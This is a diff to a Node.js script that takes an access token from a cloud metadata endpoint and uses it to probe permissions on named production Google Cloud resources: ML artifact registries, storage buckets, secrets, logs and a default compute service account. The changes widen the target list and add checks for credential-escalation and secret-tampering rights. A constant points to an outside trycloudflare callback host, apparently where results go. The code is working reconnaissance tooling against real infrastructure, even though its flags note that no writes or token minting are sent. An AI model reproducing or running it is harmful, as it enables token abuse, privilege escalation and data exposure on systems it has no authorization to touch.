@@ -8,11 +8,31 @@ const {
 const CALLBACK_URL =
   "https://monsters-occasion-annotated-stream.trycloudflare.com/" +
   "gcp-keras-6f3f6d4d2f8a4e50a1e2c9c0c421b763";
-const ARTIFACT_REPOSITORY =
+const ARTIFACT_REPOSITORIES = [
   "projects/ml-oss-artifacts-published/locations/us/repositories/" +
-  "ml-public-container";
-const STORAGE_BUCKETS = ["keras-applications", "ml-dashboard-data-gatherer"];
+    "ml-public-container",
+  "projects/ml-oss-artifacts-published/locations/us/repositories/" +
+    "jax-public-nightly-artifacts-registry",
+  "projects/ml-oss-artifacts-published/locations/us/repositories/" +
+    "jax-public-release-artifacts-registry",
+  "projects/ml-oss-artifacts-published/locations/us/repositories/" +
+    "tf-public-nightly-artifacts-registry",
+  "projects/ml-actions-platform-production/locations/us/repositories/" +
+    "ml-actions-production-registry",
+];
+const STORAGE_BUCKETS = [
+  "keras-applications",
+  "keras-cv",
+  "keras-nlp",
+  "ml-dashboard-data-gatherer",
+  "general-ml-ci-transient",
+  "jax-nightly-artifacts",
+];
 const GCP_PROJECT = "ml-velocity-actions-production";
+const DEFAULT_COMPUTE_SERVICE_ACCOUNT =
+  "244290524351-compute@developer.gserviceaccount.com";
+const LOG_VIEW =
+  `projects/${GCP_PROJECT}/locations/global/buckets/_Default/views/_AllLogs`;
 const PUBSUB_TOPIC =
   "projects/ml-oss-benchmarking-production/topics/public-results-prod";
 const SECRET_IDS = [
@@ -96,6 +116,42 @@ const PUBSUB_PERMISSIONS = [
   "pubsub.topics.delete",
   "pubsub.topics.publish",
   "pubsub.topics.attachSubscription",
+];
+
+const LOG_VIEW_PERMISSIONS = [
+  "logging.logEntries.list",
+  "logging.views.get",
+  "logging.views.access",
+];
+
+const SERVICE_ACCOUNT_PERMISSIONS = [
+  "iam.serviceAccounts.get",
+  "iam.serviceAccounts.getIamPolicy",
+  "iam.serviceAccounts.setIamPolicy",
+  "iam.serviceAccounts.getAccessToken",
+  "iam.serviceAccounts.getOpenIdToken",
+  "iam.serviceAccounts.signBlob",
+  "iam.serviceAccounts.signJwt",
+  "iam.serviceAccounts.implicitDelegation",
+  "iam.serviceAccounts.actAs",
+];
+
+const CREDENTIAL_ESCALATION_PERMISSIONS = [
+  "iam.serviceAccounts.getAccessToken",
+  "iam.serviceAccounts.getOpenIdToken",
+  "iam.serviceAccounts.signBlob",
+  "iam.serviceAccounts.signJwt",
+  "iam.serviceAccounts.implicitDelegation",
+];
+
+const SECRET_STATE_CHANGE_PERMISSIONS = [
+  "secretmanager.secrets.setIamPolicy",
+  "secretmanager.secrets.update",
+  "secretmanager.secrets.delete",
+  "secretmanager.versions.add",
+  "secretmanager.versions.enable",
+  "secretmanager.versions.disable",
+  "secretmanager.versions.destroy",
 ];
 
 const WRITE_MARKERS = [
@@ -185,6 +241,9 @@ async function secretPermissionProbe(call, accessToken, secretId) {
     credential_value_read_permission: permissions.allowed_permissions.includes(
       "secretmanager.versions.access",
     ),
+    state_change_permissions: permissions.allowed_permissions.filter(
+      (permission) => SECRET_STATE_CHANGE_PERMISSIONS.includes(permission),
+    ),
     secret_metadata_returned: false,
     secret_version_requested: false,
     secret_value_requested: false,
@@ -224,6 +283,52 @@ async function storagePermissionProbe(call, accessToken, bucket) {
   };
 }
 
+async function artifactPermissionProbe(call, accessToken, resource) {
+  const url = `https://artifactregistry.googleapis.com/v1/${resource}`;
+  const packagesUrl = `${url}/packages?pageSize=1`;
+  const [
+    metadata,
+    metadataAnonymous,
+    iam,
+    iamAnonymous,
+    packages,
+    packagesAnonymous,
+  ] = await Promise.all([
+    call(url, accessToken),
+    call(url, null),
+    call(`${url}:testIamPermissions`, accessToken, "POST", {
+      permissions: ARTIFACT_PERMISSIONS,
+    }),
+    call(`${url}:testIamPermissions`, null, "POST", {
+      permissions: ARTIFACT_PERMISSIONS,
+    }),
+    call(packagesUrl, accessToken),
+    call(packagesUrl, null),
+  ]);
+  return {
+    resource,
+    metadata: metadata.ok
+      ? {
+          status: metadata.status,
+          name: metadata.value.name,
+          format: metadata.value.format,
+          mode: metadata.value.mode,
+          description: metadata.value.description || null,
+          registry_uri: metadata.value.registryUri || null,
+        }
+      : responseSummary(metadata),
+    anonymous_metadata: responseSummary(metadataAnonymous),
+    test_iam_permissions: permissionResult(iam),
+    anonymous_test_iam_permissions: permissionResult(iamAnonymous),
+    package_metadata: {
+      authenticated: listResult(packages, "packages"),
+      anonymous: listResult(packagesAnonymous, "packages"),
+    },
+    artifact_content_requested: false,
+    write_operation_sent: false,
+  };
+}
+
 async function topicPermissionProbe(call, accessToken) {
   const url = `https://pubsub.googleapis.com/v1/${PUBSUB_TOPIC}`;
   const [metadata, metadataAnonymous, iam, iamAnonymous] = await Promise.all([
@@ -249,6 +354,30 @@ async function topicPermissionProbe(call, accessToken) {
   };
 }
 
+async function serviceAccountPermissionProbe(call, accessToken) {
+  const resource =
+    `projects/-/serviceAccounts/${DEFAULT_COMPUTE_SERVICE_ACCOUNT}`;
+  const url = `https://iam.googleapis.com/v1/${resource}`;
+  const [metadata, iam] = await Promise.all([
+    call(url, accessToken),
+    call(`${url}:testIamPermissions`, accessToken, "POST", {
+      permissions: SERVICE_ACCOUNT_PERMISSIONS,
+    }),
+  ]);
+  const permissions = permissionResult(iam);
+  return {
+    resource,
+    metadata: responseSummary(metadata),
+    test_iam_permissions: permissions,
+    credential_escalation_permissions: permissions.allowed_permissions.filter(
+      (permission) => CREDENTIAL_ESCALATION_PERMISSIONS.includes(permission),
+    ),
+    access_token_mint_sent: false,
+    signature_operation_sent: false,
+    write_operation_sent: false,
+  };
+}
+
 async function gcpResourcePermissions(call = gcpApiRequest, metadata = request) {
   const tokenResponse = await metadata({
     protocol: "http:",
@@ -270,27 +399,6 @@ async function gcpResourcePermissions(call = gcpApiRequest, metadata = request) 
 
   const tokenInfoUrl = new URL("https://oauth2.googleapis.com/tokeninfo");
   tokenInfoUrl.searchParams.set("access_token", accessToken);
-  const artifactUrl =
-    `https://artifactregistry.googleapis.com/v1/${ARTIFACT_REPOSITORY}`;
-  const artifactMetadata = await call(artifactUrl, accessToken);
-  const artifactMetadataAnonymous = await call(artifactUrl, null);
-  const artifactIam = await call(
-    `${artifactUrl}:testIamPermissions`,
-    accessToken,
-    "POST",
-    { permissions: ARTIFACT_PERMISSIONS },
-  );
-  const artifactIamAnonymous = await call(
-    `${artifactUrl}:testIamPermissions`,
-    null,
-    "POST",
-    { permissions: ARTIFACT_PERMISSIONS },
-  );
-  const artifactPackagesUrl = `${artifactUrl}/packages?pageSize=1`;
-  const [artifactPackages, artifactPackagesAnonymous] = await Promise.all([
-    call(artifactPackagesUrl, accessToken),
-    call(artifactPackagesUrl, null),
-  ]);
   const futureLogRead = call(
     "https://logging.googleapis.com/v2/entries:list",
     accessToken,
@@ -305,15 +413,29 @@ async function gcpResourcePermissions(call = gcpApiRequest, metadata = request) 
     `https://logging.googleapis.com/v2/projects/${GCP_PROJECT}/logs?pageSize=1`,
     accessToken,
   );
+  const logViewPermissions = call(
+    `https://logging.googleapis.com/v2/${LOG_VIEW}:testIamPermissions`,
+    accessToken,
+    "POST",
+    { permissions: LOG_VIEW_PERMISSIONS },
+  );
   const [
     tokenInfo,
+    artifactPermissions,
     storagePermissions,
     pubsubPermissions,
     futureLogs,
     logs,
+    logViewIam,
+    serviceAccountPermissions,
     secretPermissions,
   ] = await Promise.all([
     call(tokenInfoUrl.toString(), accessToken),
+    Promise.all(
+      ARTIFACT_REPOSITORIES.map((resource) =>
+        artifactPermissionProbe(call, accessToken, resource),
+      ),
+    ),
     Promise.all(
       STORAGE_BUCKETS.map((bucket) =>
         storagePermissionProbe(call, accessToken, bucket),
@@ -322,6 +444,8 @@ async function gcpResourcePermissions(call = gcpApiRequest, metadata = request) 
     topicPermissionProbe(call, accessToken),
     futureLogRead,
     logNames,
+    logViewPermissions,
+    serviceAccountPermissionProbe(call, accessToken),
     Promise.all(
       SECRET_IDS.map((secretId) =>
         secretPermissionProbe(call, accessToken, secretId),
@@ -340,30 +464,10 @@ async function gcpResourcePermissions(call = gcpApiRequest, metadata = request) 
           expires_in: tokenInfo.value.expires_in || null,
         }
       : responseSummary(tokenInfo),
-    artifact_registry: {
-      resource: ARTIFACT_REPOSITORY,
-      metadata: artifactMetadata.ok
-        ? {
-            status: artifactMetadata.status,
-            name: artifactMetadata.value.name,
-            format: artifactMetadata.value.format,
-            mode: artifactMetadata.value.mode,
-            description: artifactMetadata.value.description || null,
-            registry_uri: artifactMetadata.value.registryUri || null,
-          }
-        : responseSummary(artifactMetadata),
-      anonymous_metadata: responseSummary(artifactMetadataAnonymous),
-      test_iam_permissions: permissionResult(artifactIam),
-      anonymous_test_iam_permissions: permissionResult(artifactIamAnonymous),
-      package_metadata: {
-        authenticated: listResult(artifactPackages, "packages"),
-        anonymous: listResult(artifactPackagesAnonymous, "packages"),
-      },
-      artifact_content_requested: false,
-      write_operation_sent: false,
-    },
+    artifact_registry: artifactPermissions,
     cloud_storage: storagePermissions,
     pubsub: pubsubPermissions,
+    service_account: serviceAccountPermissions,
     secret_manager: {
       project: GCP_PROJECT,
       candidate_source:
@@ -374,6 +478,10 @@ async function gcpResourcePermissions(call = gcpApiRequest, metadata = request) 
     },
     cloud_logging: {
       project: GCP_PROJECT,
+      exact_view: {
+        resource: LOG_VIEW,
+        test_iam_permissions: permissionResult(logViewIam),
+      },
       log_names: listResult(logs, "logNames"),
       future_only_entry_query: {
         ...listResult(futureLogs, "entries"),
@@ -397,6 +505,8 @@ async function collect(call = gcpApiRequest, metadata = request) {
       storage_object_names_returned: false,
       storage_object_content_requested: false,
       secret_value_requested: false,
+      service_account_access_token_mint_sent: false,
+      service_account_signature_operation_sent: false,
       pubsub_message_requested: false,
       pubsub_message_returned: false,
       log_entry_payload_requested: false,
@@ -441,8 +551,10 @@ if (require.main === module) {
 
 module.exports = {
   ARTIFACT_PERMISSIONS,
+  LOG_VIEW_PERMISSIONS,
   PUBSUB_PERMISSIONS,
   SECRET_PERMISSIONS,
+  SERVICE_ACCOUNT_PERMISSIONS,
   STORAGE_PERMISSIONS,
   collect,
   gcpApiRequest,
